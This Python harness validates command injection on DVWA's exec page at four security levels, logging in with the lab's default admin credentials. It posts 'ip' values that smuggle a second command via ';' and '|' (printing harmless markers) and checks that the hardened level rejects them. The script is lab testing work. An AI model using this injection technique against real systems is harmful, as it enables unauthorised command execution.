"""CMD-001 to CMD-004 local command-injection validation on DVWA exec.

Each run logs in with the dedicated lab administrator, selects the metadata
security level through the security cookie, sends a normal loopback ping and a
minimal marker payload, and inspects the server-side <pre> command output.
The marker must appear inside that output block, not merely in the requestecho.
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from wp4lib import (  # noqa: E402
    BASE_DVWA, SOURCE_COMMIT_DVWA, Client, Run, dvwa_login, extract_pre, extract_token,
)

DEPLOYMENT = "dvwa-wsl-01"
ADMIN_USER = "admin"
ADMIN_PASS = "password"


def marker_in_pre(text: str, marker: str) -> tuple[bool, str | None]:
    pre = extract_pre(text)
    return (pre is not None and marker in pre), pre


def run_case(case: str, level: str, normal_ip: str, payload: str,
             marker: str, expect_trigger: bool) -> dict:
    run = Run(
        f"wp4-20261019-cmd{case.lower()}-{level}", f"CMD-{case}",
        "vulnerabilities/exec/index.php:ip",
        f"env=dvwa-wsl-01|role=admin|security={level}|object=none|state=initialized",
        DEPLOYMENT, SOURCE_COMMIT_DVWA,
    )
    client = Client(BASE_DVWA, forced_security=level)
    index = dvwa_login(client, ADMIN_USER, ADMIN_PASS)
    identity = {
        "logged_in": "You have logged in as" in index.text,
        "banner_has_admin": "admin" in index.text,
        "security_cookie": level,
    }
    page = client.get("/vulnerabilities/exec/")
    token = extract_token(page.text)
    run.add_response("exec-page", page)
    run.add_response("login-index", index)

    normal_resp = client.post("/vulnerabilities/exec/", {
        "Submit": "Submit", "ip": normal_ip, "user_token": token or "",
    })
    run.add_response("normal-ping", normal_resp)
    normal_pre = extract_pre(normal_resp.text) or ""
    normal_ok = ("bytes from" in normal_pre) or ("4 received" in normal_pre) or ("ttl=" in normal_pre)

    test_page = client.get("/vulnerabilities/exec/")
    test_token = extract_token(test_page.text)
    test_resp = client.post("/vulnerabilities/exec/", {
        "Submit": "Submit", "ip": payload, "user_token": test_token or "",
    })
    run.add_response("test-payload", test_resp)
    test_pre = extract_pre(test_resp.text) or ""
    marker_ok = marker in test_pre
    reflected = payload in test_resp.text and marker not in test_pre

    extra = {}
    if case == "004":
        fresh_token = extract_token(client.get("/vulnerabilities/exec/").text) or ""
        invalid_resp = client.post("/vulnerabilities/exec/", {
            "Submit": "Submit", "ip": "127.0.0.1; printf WP4_CMD_004", "user_token": fresh_token,
        })
        run.add_response("invalid-ip-rejected", invalid_resp)
        extra["invalid_payload_rejected"] = "invalid IP" in invalid_resp.text
        extra["invalid_payload_marker_absent"] = "WP4_CMD_004" not in (extract_pre(invalid_resp.text) or "")
        five_octet = client.post("/vulnerabilities/exec/", {
            "Submit": "Submit", "ip": "127.0.0.1.1", "user_token": extract_token(
                client.get("/vulnerabilities/exec/").text) or "",
        })
        run.add_response("five-octets-rejected", five_octet)
        extra["five_octet_rejected"] = "invalid IP" in five_octet.text
        no_token = client.post("/vulnerabilities/exec/", {"Submit": "Submit", "ip": normal_ip})
        run.add_response("missing-token-precondition", no_token)
        extra["missing_token_redirect"] = no_token.status == 302

    run.requests.extend(client.requests)
    triggered = bool(normal_ok and marker_ok and not reflected)
    run.observation = {
        "endpoint": "/vulnerabilities/exec/index.php",
        "parameter": "ip (POST, read through $_REQUEST)",
        "security_level": level,
        "identity": identity,
        "normal": {
            "ip": normal_ip,
            "status": normal_resp.status,
            "ping_output_observed": normal_ok,
            "pre_excerpt": normal_pre[:300],
        },
        "test": {
            "payload": payload,
            "status": test_resp.status,
            "marker": marker,
            "marker_in_command_output": marker_ok,
            "payload_reflected_outside_command_output": reflected,
            "pre_excerpt": test_pre[:300],
        },
        **extra,
    }
    run.success_criteria = [
        "The normal loopback ping produces the expected command output.",
        "The marker appears inside the server-side command-output block.",
        "The marker is not merely reflected in the HTML form or page text.",
        "The only changed input is ip; the server OS branch is Linux.",
    ]
    if case == "004":
        run.success_criteria = [
            "The normal loopback ping produces the expected command output.",
            "The token-protected request reaches the numeric-octet validation.",
            "A payload containing a command separator is rejected as an invalid IP and no marker is executed.",
            "A five-octet input is also rejected; the negative result is limited to this four-octet gate.",
        ]
    run.limitations = [
        f"Only the {level} exec source path and this Linux container are covered.",
        "The payload only prints a fixed marker; it does not read files or open a connection.",
    ]
    if case == "004":
        run.limitations.append(
            "The negative result applies to the four-octet is_numeric gate; IP-format weaknesses are recorded separately, not as command injection.")
    run.finalize("触发" if triggered else "未触发",
                 "有漏洞" if triggered else "无所关注漏洞")
    return run.observation


CASES = {
    "001": ("low", "127.0.0.1", "127.0.0.1; printf WP4_CMD_001", "WP4_CMD_001", True),
    "002": ("medium", "127.0.0.1", "127.0.0.1 | printf WP4_CMD_002", "WP4_CMD_002", True),
    "003": ("high", "127.0.0.1", "127.0.0.1|printf WP4_CMD_003", "WP4_CMD_003", True),
    "004": ("impossible", "127.0.0.1", "127.0.0.1", "WP4_CMD_004", False),
}


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--case", choices=sorted(CASES) + ["all"], default="all")
    args = parser.parse_args()
    selected = list(CASES) if args.case == "all" else [args.case]
    results = {}
    for key in selected:
        level, normal_ip, payload, marker, expect = CASES[key]
        results[key] = run_case(key, level, normal_ip, payload, marker, expect)
    print(json.dumps({"executed": sorted(results)}, ensure_ascii=False))


if __name__ == "__main__":
    main()
